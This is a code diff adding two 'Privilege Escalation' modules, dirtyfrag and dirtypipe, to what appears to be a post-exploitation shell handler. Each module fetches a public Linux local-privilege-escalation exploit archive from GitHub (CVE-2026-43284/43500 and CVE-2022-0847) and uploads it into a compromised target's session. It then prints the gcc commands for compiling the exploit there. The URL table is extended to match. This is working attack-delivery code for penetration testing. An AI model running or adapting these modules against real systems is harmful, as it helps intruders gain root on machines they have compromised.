@@ -4910,6 +4910,55 @@ class panix(Module):
 			logger.error("This module runs only on Unix shells")
 
 
+class dirtyfrag(Module):
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Upload DirtyFrag exploit as 'dirtyfrag' folder
+		CVE-2026-43284: xfrm-ESP Page-Cache Write
+		CVE-2026-43500: RxRPC Page-Cache Write
+		Universal Linux LPE - no race condition required
+		Source: https://github.com/v4bel/dirtyfrag
+		"""
+		if session.OS != 'Unix':
+			logger.error("This module runs only on Unix shells")
+			return
+		if not session.write_access(session.cwd):
+			return
+		_, archive = url_to_bytes(URLS['dirtyfrag_zip'])
+		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(tmpdir)
+				extracted_folder = list(Path(tmpdir).iterdir())[0]
+				renamed_folder = extracted_folder.parent / "dirtyfrag"
+				os.rename(extracted_folder, renamed_folder)
+				session.upload(str(renamed_folder))
+		logger.info("DirtyFrag uploaded. Compile on target: cd dirtyfrag && gcc exp.c -o exp")
+
+
+class dirtypipe(Module):
+	category = "Privilege Escalation"
+	def run(session, args):
+		"""
+		Upload DirtyPipe (CVE-2022-0847) exploits as 'dirtypipe' folder
+		Source: https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits
+		"""
+		if session.OS != 'Unix':
+			logger.error("This module runs only on Unix shells")
+			return
+		if not session.write_access(session.cwd):
+			return
+		_, archive = url_to_bytes(URLS['dirtypipe_zip'])
+		with tempfile.TemporaryDirectory(prefix="extract_") as tmpdir:
+			with zipfile.ZipFile(io.BytesIO(archive)) as z:
+				z.extractall(tmpdir)
+				extracted_folder = list(Path(tmpdir).iterdir())[0]
+				renamed_folder = extracted_folder.parent / "dirtypipe"
+				os.rename(extracted_folder, renamed_folder)
+				session.upload(str(renamed_folder))
+		logger.info("DirtyPipe uploaded. Compile on target: cd dirtypipe && gcc exploit-1.c -o exploit-1  ||  gcc exploit-2.c -o exploit-2")
+
+
 class meterpreter(Module):
 	def run(session, args):
 		"""
@@ -5754,6 +5803,8 @@ URLS = {
 	'sigmapotato':		"https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe",
 	'printspoofer64':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe",
 	'printspoofer32':	"https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe",
+	'dirtyfrag_zip':	"https://github.com/v4bel/dirtyfrag/archive/refs/heads/master.zip",
+	'dirtypipe_zip':	"https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/archive/refs/heads/main.zip",
 }
 EMOJIS = {
 	'folder':'📁', 'file':'📄', 'invalid_shell':'🙄', 'new_shell':'😍️', 'target':'🎯', 'upgrade':'💪', 'logfile':'📜',
